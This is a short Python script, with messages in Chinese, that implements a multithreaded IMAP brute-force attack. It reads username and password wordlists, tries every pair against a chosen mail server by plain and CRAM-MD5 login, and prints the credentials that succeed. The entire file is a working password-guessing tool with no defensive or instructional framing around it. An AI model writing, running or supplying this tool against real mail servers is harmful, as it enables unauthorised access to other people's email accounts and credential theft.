# -*- coding: utf-8 -*-
import imaplib
import threading
import asyncio

class imapBrust(threading.Thread):
    def __init__(self,mailAddr, mailPort, userLines,passLines):
        threading.Thread.__init__(self)
        self.mailAddr = mailAddr
        self.mailPort = mailPort
        self.userLines = userLines
        self.passLines = passLines
    def run(self):
        try:
            imaplib.IMAP4(self.mailAddr, self.mailPort)
        except:
            print("[-]错误信息:服务器错误！")
            return 1
        if len(self.userLines) < 1 or len(self.passLines) < 1:
            print("[-]错误信息:字典文件中无内容，请检查！")
            return 1
        for index in range(len(self.userLines)):
            for i in range(len(self.passLines)):
                threadLock.acquire()
                loop.run_until_complete(login(self.mailAddr,self.mailPort, self.userLines[index],self.passLines[i]))
                threadLock.release()
                continue
async def login(mailAddr,mailPort,username,password):
    try:
        username = username.replace("\n", "")
        password = password.replace("\n", "")
        imapServer = imaplib.IMAP4(mailAddr, mailPort)
        imapServer.login(username, password)
        print("[-]密码正确" + "账户名:" + username + "密码:" + password)
    except:
        try:
            username = username.replace("\n", "")
            password = password.replace("\n", "")
            imapServer = imaplib.IMAP4(mailAddr, mailPort)
            imapServer.login_cram_md5(username, password)
            print("[-]密码正确" + "账户名:" + username + "密码:" + password)
        except:
            print("[-]错误信息:密码错误!")
threadLock = threading.Lock()
loop = asyncio.get_event_loop()